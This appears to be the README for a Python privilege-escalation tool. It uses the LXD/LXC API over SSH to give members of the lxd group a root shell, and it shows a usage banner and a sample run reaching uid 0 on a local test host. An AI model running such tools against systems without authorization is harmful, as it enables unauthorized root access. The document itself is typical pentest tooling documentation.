# lxc_privesc_rce.py

## Summary

This exploit ssh into a machine and gives you a root shell by abuse the lxc api if you are part of the lxd group that have the same os permissions as root so this is no bug. However this exploit is convinient if you want to
have a root shell

## Requirments

* Your user account need to be part of the 'lxd' group.

## Exploit

Show usage menu

```sh
⬢  lxc_privesc_rce  master ⦿ ./lxc_privesc_rce.py

██╗     ██╗  ██╗ ██████╗    ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗    ██████╗  ██████╗███████╗
██║     ╚██╗██╔╝██╔════╝    ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║      ╚███╔╝ ██║         ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║         ██████╔╝██║     █████╗
██║      ██╔██╗ ██║         ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║         ██╔══██╗██║     ██╔══╝
███████╗██╔╝ ██╗╚██████╗    ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗    ██║  ██║╚██████╗███████╗
╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
[nighter@nighter.se]

Usage: ./lxc_privesc_rce.py <USERNAME>@<HOST:[PORT]>
```

Run the exploit

```sh
lxc_privesc_rce  master ⦿ ./lxc_privesc_rce.py vagrant@127.0.0.1:2222
root@privesc:/# id
uid=0(root) gid=0(root) groups=0(root)
```
